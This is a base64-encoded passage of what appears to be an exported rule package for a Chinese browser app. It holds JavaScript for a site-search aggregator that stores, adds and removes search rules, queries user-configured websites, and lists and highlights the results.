vCflKXpu5HmtbfmtIvwn5SlQGh0dHBzOi8vYmxvZy51cHg4LmNvbS9zZWFyY2gvKiovYDtcXG5sZXQgcnVsZXNUZXh0ID0gZ2V0SXRlbShcXFwicnVsZXNcXFwiLCBydWxlc1RleHQwKTtcXG5sZXQgc3AgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9zcFxcXCIpO1xcbnJ1bGVzID0gcnVsZXNUZXh0LnNwbGl0KFxcXCJcXFxcblxcXCIpXFxuICAgIC5maWx0ZXIoaXQgPT4gaXQuaW5jbHVkZXMoXFxcIkBcXFwiKSlcXG4gICAgLm1hcChydWxlID0+IHtcXG4gICAgICAgIGxldCBzID0gcnVsZS5zcGxpdChcXFwiQFxcXCIpO1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICBuYW1lOiBzWzBdLFxcbiAgICAgICAgICAgIGZpbmQ6IGZ1bmN0aW9uKGtleSwgcGFnZSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gc3Aoc1sxXSwga2V5LCBzWzBdKTtcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIHVybDogc1sxXVxcbiAgICAgICAgfTtcXG4gICAgfSk7XFxuXFxuZnVuY3Rpb24gbG9hZChwYWdlLCBydWxlKSB7XFxuICAgIGxldCBzaXplID0gcGFnZSA8PSAwID8gcnVsZXMubGVuZ3RoIDogc2l6ZTA7XFxuICAgIHBhZ2UgPSBwYWdlIDw9IDAgPyAxIDogcGFnZTtcXG4gICAgaWYgKCFwYWdlICYmICFydWxlKSB7XFxuICAgICAgICByZXR1cm4gcnVsZXMubWFwKGl0ID0+IGl0Lm5hbWUpO1xcbiAgICB9XFxuICAgIGlmIChydWxlICE9IG51bGwpIHtcXG4gICAgICAgIGlmIChwYWdlICE9IG51bGwgJiYgcGFnZSA+IDEpIHtcXG4gICAgICAgICAgICByZXR1cm4gcnVsZXMuZmlsdGVyKGkgPT4gaS5uYW1lID09IHJ1bGUgJiYgaS5wYWdlKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSk7XFxuICAgIH1cXG4gICAgbGV0IHN0YXJ0ID0gKHBhZ2UgLSAxKSAqIHNpemU7XFxuICAgIGlmIChydWxlcy5sZW5ndGggPCBzdGFydCArIDEpIHtcXG4gICAgICAgIHJldHVybiBbXTtcXG4gICAgfVxcbiAgICBsZXQgbGVuID0gc2l6ZTtcXG4gICAgaWYgKHJ1bGVzLmxlbmd0aCA8IHBhZ2UgKiBzaXplKSB7XFxuICAgICAgICBsZW4gPSBydWxlcy5sZW5ndGggLSBzdGFydFxcbiAgICB9XFxuICAgIHJldHVybiBydWxlcy5zbGljZShzdGFydCwgc3RhcnQgKyBsZW4pO1xcbn1cXG5cXG5mdW5jdGlvbiBhZGRSdWxlKG5hbWUsIHN1cmwpIHtcXG4gICAgc2V0SXRlbShcXFwicnVsZXNcXFwiLCBydWxlc1RleHQgKyBcXFwiXFxcXG5cXFwiICsgbmFtZSArIFxcXCJAXFxcIiArIHN1cmwpO1xcbn1cXG5cXG5mdW5jdGlvbiByZW1vdmVSdWxlKG5hbWUpIHtcXG4gICAgbGV0IG5ld1QgPSBydWxlc1RleHQuc3BsaXQoXFxcIlxcXFxuXFxcIilcXG4gICAgICAgIC5maWx0ZXIoaXQgPT4gaXQuaW5kZXhPZihuYW1lICsgXFxcIkBcXFwiKSA8IDApXFxuICAgICAgICAuam9pbihcXFwiXFxcXG5cXFwiKTtcXG4gICAgc2V0SXRlbShcXFwicnVsZXNcXFwiLCBuZXdUKTtcXG59XFxuXFxuJC5leHBvcnRzID0ge1xcbiAgICBsb2FkOiBsb2FkLFxcbiAgICBhZGRSdWxlOiBhZGRSdWxlLFxcbiAgICByZW1vdmVSdWxlOiByZW1vdmVSdWxlXFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pCc57Si6Kej5p6QXCIsXCJwYXRoXCI6XCJzcFwiLFwicnVsZVwiOlwiZnVuY3Rpb24gc2VhcmNoKHVybCwga2V5LCBydWxlKSB7XFxuICAgIGxldCBkID0gW107XFxuICAgIGxldCBodG1sID0gXFxcIlxcXCI7XFxuICAgIGlmICh1cmwuaW5jbHVkZXMoXFxcIioqXFxcIikpIHtcXG4gICAgICAgIC8vZ2V06K+35rGCXFxuICAgICAgICBsZXQgb2xkID0gdXJsO1xcbiAgICAgICAgdXJsID0gdXJsLnJlcGxhY2UoXFxcIioqXFxcIiwga2V5KTtcXG4gICAgICAgIGh0bWwgPSByZXF1ZXN0KHVybCk7XFxuICAgICAgICAvL+iHquWKqOi/h+mqjOivgeeggeWSjOmikee5geiuv+mXrumZkOWItlxcbiAgICAgICAgbGV0IHtcXG4gICAgICAgICAgICBjaGVjaywgdGVzdFxcbiAgICAgICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3l6bVxcXCIpO1xcbiAgICAgICAgaWYgKGNoZWNrKHVybCwgaHRtbCwgZCkpIHtcXG4gICAgICAgICAgICBsb2coXFxcIumHjeivleS6hlxcXCIpO1xcbiAgICAgICAgICAgIGh0bWwgPSByZXF1ZXN0KHVybCwge1xcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICAgICBcXFwiUmVmZXJlclxcXCI6IHVybFxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7ICAgICAgICAgICBcXG4gICAgICAgIH0gICAgICAgICBcXG4gICAgICAgIHRlc3QodXJsLCBodG1sLCBkLCBvbGQsIGtleSwgcnVsZSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICAvL+iHquWKqOivhuWIq3Bvc3Tor7fmsYJcXG4gICAgICAgIGh0bWwgPSByZXF1ZXN0KHVybCk7XFxuICAgICAgICBsZXQgZm9ybSA9IHBkZmgoaHRtbCwgXFxcImJvZHkmJmZvcm0mJkh0bWxcXFwiKTtcXG4gICAgICAgIGxldCBhY3Rpb24gPSBwZChodG1sLCBcXFwiZm9ybSYmYWN0aW9uXFxcIiwgdXJsKTtcXG4gICAgICAgIGxldCBpbnB1dHMgPSBwZGZhKGh0bWwsIFxcXCJib2R5JiZmb3JtJiZpbnB1dFxcXCIpO1xcbiAgICAgICAgbGV0IGJvZHkgPSB7fTtcXG4gICAgICAgIGZvciAobGV0IGl0IG9mIGlucHV0cykge1xcbiAgICAgICAgICAgIGxldCBuYW1lID0gcGRmaChpdCwgXFxcImlucHV0JiZuYW1lXFxcIik7XFxuICAgICAgICAgICAgaWYgKG5hbWUgJiYgbmFtZSAhPSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgICAgICBsZXQgdmFsdWUgPSBwZGZoKGl0LCBcXFwiaW5wdXQmJnZhbHVlXFxcIik7XFxuICAgICAgICAgICAgICAgIGJvZHlbbmFtZV0gPSB2YWx1ZSB8fCBrZXk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgaHRtbCA9IHBvc3QoYWN0aW9uLCB7XFxuICAgICAgICAgICAgYm9keTogYm9keVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG5cXG4gICAgbGV0IGFsaXN0ID0gcGRmYShodG1sLCBcXFwiYm9keSYmYVxcXCIpO1xcbiAgICBsZXQgYXJyID0gYWxpc3QubWFwKGl0ID0+IHtcXG4gICAgICAgIGxldCB0ID0gcGRmaChpdCwgXFxcImEmJlRleHRcXFwiKTtcXG4gICAgICAgIGxldCB0MiA9IHBkZmgoaXQsIFxcXCJhJiZ0aXRsZVxcXCIpO1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgICAvL2h0bWw6IGl0LFxcbiAgICAgICAgICAgIHRleHQ6IHQyICYmIHQyLmluY2x1ZGVzKGtleSkgPyB0MiA6IHQsXFxuICAgICAgICAgICAgaHJlZjogcGQoaXQsIFxcXCJhJiZocmVmXFxcIiwgdXJsKVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG5cXG4gICAgZnVuY3Rpb24gaXNSZXN1bHQoaXQpIHtcXG4gICAgICAgIGl0ID0gaXQudGV4dCB8fCBcXFwiXFxcIjtcXG4gICAgICAgIGlmIChpdCA9PSBcXFwiXFxcIiB8fCBpdC5tYXRjaCgv5pCc57SifOe7k+aenC8pKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlXFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXQudG9Mb3dlckNhc2UoKS5pbmNsdWRlcyhrZXkpO1xcbiAgICB9XFxuICAgIGtleSA9IGtleS50b0xvd2VyQ2FzZSgpO1xcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcbiAgICAgICAgbGV0IHQgPSBpdC50ZXh0O1xcbiAgICAgICAgaWYgKCFpdC5ocmVmIHx8IGl0LmhyZWYgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgICAgICBjb250aW51ZTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChpc1Jlc3VsdChpdCkpIHtcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogdCxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3A/dT1cXFwiICsgYmFzZTY0RW5jb2RlKGl0LmhyZWYpLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFwiICsgcnVsZSArIFxcXCI8L2ZvbnQ+XFxcIlxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHJldHVybiBkO1xcbn1cXG4kLmV4cG9ydHMgPSBzZWFyY2g7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLlop7liKBcIixcInBhdGhcIjpcIm1hbmFnZVwiLFwicnVsZVwiOlwiJC5leHBvcnRzID0gZnVuY3Rpb24oZCwgbmFtZXMpIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwiQUnmioDmnK9cXFwiLFxcbiAgICAgICAgdXJsOiBcXFwiY29uZmlybTovL+WfuuS6jkFJ6K+G54mH6Ieq5Yqo5YiG5p6Q5rqQ56CB5oqA5pyv77yM5Luj56CB5a6M5YWo5byA5rqQ77yM5pWw5o2u5p2l5rqQ5LqO5Y6f572R56uZ77yM6L2v5Lu25ZKM6KeE5YiZ5LiN5o+Q5L6b5Lu75L2V5YaF5a65LmpzOicnXFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiZmxleF9idXR0b25cXFwiXFxuICAgIH0pO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCIgKyBcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChycikgPT4ge1xcbiAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhcXFwiYWlhZGRcXFwiKTtcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIocnIgKyBcXFwiYWlzZGVsXFxcIiwgW3tcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXnvZHnq5nlkI3np7BcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DaGFuZ2U6IFxcXCJwdXRNeVZhcignbmFtZScsIGlucHV0KVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzOiBcXFwiYWlhZGRcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLor7fovpPlhaXnvZHnq5nmkJzntKLlnLDlnYBcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DaGFuZ2U6IFxcXCJwdXRNeVZhcignc3VybCcsIGlucHV0KVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzOiBcXFwiYWlhZGRcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5o+Q5Lqk5L+d5a2YXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBzdXJsID0gZ2V0TXlWYXIoXFxcInN1cmxcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG5hbWUgPSBnZXRNeVZhcihcXFwibmFtZVxcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3VybCA9PSBcXFwiXFxcIiB8fCBuYW1lID09IFxcXCJcXFwiKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/or7fovpPlhaXlrozmlbTlhoXlrrlcXFwiXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCByID0gZGVjb2RlVVJJQ29tcG9uZW50KHN1cmwpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByLnJlcGxhY2UobmV3IFJlZ0V4cChcXFwiW1xcXFx1NGUwMC1cXFxcdTlmYTVdK1xcXCIsIFxcXCJnXFxcIiksIFxcXCIqKlxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFkZFJ1bGVcXG4gICAgICAgICAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGFkZFJ1bGUobmFtZSwgcik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey5L+d5a2YXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjbHM6IFxcXCJhaWFkZFxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIF0pO1xcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgIH0sIE1ZX1JVTEUudGl0bGUpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJmbGV4X2J1dHRvblxcXCIsXFxuICAgIH0pO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCIgLSBcXFwiLFxcbiAgICAgICAgdXJsOiBcXFwic2VsZWN0Oi8vXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICBvcHRpb25zOiBuYW1lcyxcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuivt+mAieaLqeimgeWIoOmZpOeahOermeeCuVxcXCIsXFxuICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQge1xcbiAgICAgICAgICAgICAgICAgICAgcmVtb3ZlUnVsZVxcbiAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXCIpO1xcbiAgICAgICAgICAgICAgICByZW1vdmVSdWxlKGlucHV0KTtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL09LXFxcIjtcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcImZsZXhfYnV0dG9uXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaWQ6IE1ZX1JVTEUudGl0bGUgKyBcXFwiYWlzZGVsXFxcIlxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiXFxuICAgIH0pO1xcblxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIumqjOivgeeggVwiLFwicGF0aFwiOlwieXptXCIsXCJydWxlXCI6XCJmdW5jdGlvbiBjaGVjayh1cmwsIGh0bWwsIGQpIHtcXG4gICAgbGV0IHJlbG9hZCA9IGZhbHNlO1xcbiAgICByZXR1cm4gcmVsb2FkO1xcbn1cXG5cXG5mdW5jdGlvbiB0ZXN0KHVybCwgaHRtbCwgZCwgb2xkLCBrZXksIHJ1bGUpIHtcXG4gICAgaWYgKC8156eSfOmikee5gS8udGVzdChodG1sKSkge1xcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogJ+aQnOe0oumcgOmXtOmalDXnp5LvvIzngrnlh7vph43mlrDliqDovb0nLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgICAgICBkZXNjOiBcXFwi4oCc4oCc4oCd4oCdPGZvbnQgY29sb3I9I2YxM2I2NmE+XFxcIiArIHJ1bGUgKyBcXFwiPC9mb250PlxcXCIsXFxuICAgICAgICAgICAgdXJsOiAkKCkubGF6eVJ1bGUoKHVybCwgb2xkLCBrZXksIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHNwID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2Uvc3BcXFwiKTtcXG4gICAgICAgICAgICAgICAgbGV0IGQgPSBzcChvbGQsIGtleSwgcnVsZSk7XFxuICAgICAgICAgICAgICAgIGxldCB7XFxuICAgICAgICAgICAgICAgICAgICB3cmFwXFxuICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS90b29sXFxcIik7XFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGl0IG9mIGQpIHtcXG4gICAgICAgICAgICAgICAgICAgIGl0LnRpdGxlID0gd3JhcChpdC50aXRsZSwga2V5KTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIodXJsLCBkKTtcXG4gICAgICAgICAgICAgICAgZGVsZXRlSXRlbSh1cmwpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8vT0tcXFwiO1xcbiAgICAgICAgICAgIH0sIHVybCwgb2xkLCBrZXksIHJ1bGUpLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiB1cmxcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcbn1cXG5cXG4kLmV4cG9ydHMgPSB7XFxuICAgIGNoZWNrOiBjaGVjayxcXG4gICAgdGVzdDogdGVzdFxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuW3peWFt1wiLFwicGF0aFwiOlwidG9vbFwiLFwicnVsZVwiOlwiZnVuY3Rpb24gd3JhcCh0ZXh0LCBzKSB7XFxuICAgIHJldHVybiB0ZXh0LmluY2x1ZGVzKFxcXCLigJzigJzigJ3igJ1cXFwiKSA/IHRleHQgOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIHRleHQucmVwbGFjZShuZXcgUmVnRXhwKFxcXCI8ZW0+fDwvZW0+XFxcIiwgXFxcImdcXFwiKSwgXFxcIlxcXCIpLnJlcGxhY2UobmV3IFJlZ0V4cChzLCBcXFwiZ1xcXCIpLCBcXFwiPHN0cm9uZz48c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiAjMUU5MEZGXFxcXFxcXCI+XFxcIiArIHMgKyBcXFwiPC9zcGFuPjwvc3Ryb25nPlxcXCIpXFxufVxcbiQuZXhwb3J0cyA9IHtcXG4gICAgd3JhcDogd3JhcFxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuWNleaQnFwiLFwicGF0aFwiOlwic2luZ2xlc1wiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogXFxcIuaQnOe0olxcXCIsXFxuICAgIHVybDogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICBwdXRNeVZhcihcXFwic29cXFwiLCBpbnB1dCk7XFxuICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgIGRlc2M6IFxcXCLor7fovpPlhaXlhbPplK7or43vvIzlsL3ph4/lsJHlrZfkuI3opoHlpJrlrZdcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogZ2V0TXlWYXIoXFxcInNvXFxcIiwgXFxcIlxcXCIpXFxuICAgIH1cXG59KTtcXG5sZXQgcyA9IGdldE15VmFyKFxcXCJzb1xcXCIsIFxcXCJcXFwiKTtcXG5sZXQgciA9IFxcXCJcXFwiO1xcbmlmIChzICE9IFxcXCJcXFwiKSB7XFxuICAgIGxldCBwID0gTVlfUEFHRTtcXG4gICAgbGV0IHtcXG4gICAgICAgIGxvYWRcXG4gICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFwiKTtcXG4gICAgbGV0IHtcXG4gICAgICAgIHdyYXBcXG4gICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3Rvb2xcXFwiKTtcXG4gICAgbGV0IGRhdGEgPSBsb2FkKHAsIE1ZX1BBUkFNUy5SVUxFLm5hbWUpO1xcbiAgICBsZXQgYXJyID0gZGF0YVswXS5maW5kKHMsIHApO1xcbiAgICBmb3IgKGxldCBpdCBvZiBhcnIpIHtcXG4gICAgICAgIGl0LnRpdGxlID0gd3JhcChpdC50aXRsZSwgcylcXG4gICAgICAgIGQucHVzaChpdCk7XFxuICAgIH1cXG59XFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pCc57Si6aG16Z2iXCIsXCJwYXRoXCI6XCJzb3VwXCIsXCJydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbmlmIChNWV9QQVJBTVMua2V5ICYmIGdldE15VmFyKFxcXCJ1c2VcXFwiLCBcXFwiXFxcIikgPT0gXFxcIlxcXCIpIHtcXG4gICAgcHV0TXlWYXIoXFxcInNvdVxcXCIsIE1ZX1BBUkFNUy5rZXkpO1xcbiAgICBwdXRNeVZhcihcXFwidXNlXFxcIiwgXFxcIjFcXFwiKTtcXG4gICAgYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcInVzZVxcXCIpO1xcbiAgICB9KSk7XFxufVxcbiQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL3BybycpXCJ9XSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwiQUnova/ku7ZcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL2VtcHR5XCIsXCJjb2xfdHlwZVwiOlwieDVfd2Vidmlld19zaW5nbGVcIixcImZpbmRfcnVsZVwiOlwianM6c2V0UmVzdWx0KFt7XFxuICAgIHVybDpcXFwiaHR0cHM6Ly93d3cuaTN6aC5jb21cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwiXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuS6jOe6p+ino+aekFxcXCIsXFxcInBhdGhcXFwiOlxcXCJwXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbmxldCB1cmwgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcXFxcXCJ1XFxcXFxcXCIpKTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgdXJsOiB1cmwsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcImZsb2F0JiYxMDAlXFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBjYW5CYWNrOiB0cnVlXFxcXG4gICAgfVxcXFxufSk7XFxcXG5zZXRSZXN1bHQoZCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcInRleHRfMVxcXCIsXFxcIm5hbWVcXFwiOlxcXCLmkJzntKLmtYvor5VcXFwiLFxcXCJwYXRoXFxcIjpcXFwic1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmxldCB1cmwgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcXFxcXCJ1XFxcXFxcXCIpKTtcXFxcbmxvZyh1cmwpO1xcXFxubGV0IGtleSA9IGdldFBhcmFtKFxcXFxcXFwia2V5XFxcXFxcXCIpO1xcXFxubGV0IHNwID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3NwXFxcXFxcXCIpO1xcXFxuc2V0UmVzdWx0KHNwKHVybCwga2V5LCBcXFxcXFxcIuaQnOe0oua1i+ivlVxcXFxcXFwiKSk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6IGa5ZCI5pCc57SiXFxcIixcXFwicGF0aFxcXCI6XFxcInByb1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJ2YXIgZCA9IFtdO1xcXFxuaWYgKE1ZX1BBR0UgPT0gMSkge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuaQnOe0olxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgICAgIGRlc2M6IFxcXFxcXFwi6K+36L6T5YWl5YWz6ZSu6K+N77yM5bC96YeP5bCR5a2X5LiN6KaB5aSa5a2XXFxcXFxcXCIsXFxcXG4gICAgICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKFxcXFxcXFwic291XFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwic291XFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBhZGRMaXN0ZW5lcihcXFxcXFxcIm9uQ2xvc2VcXFxcXFxcIiwgJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgIGNsZWFyTXl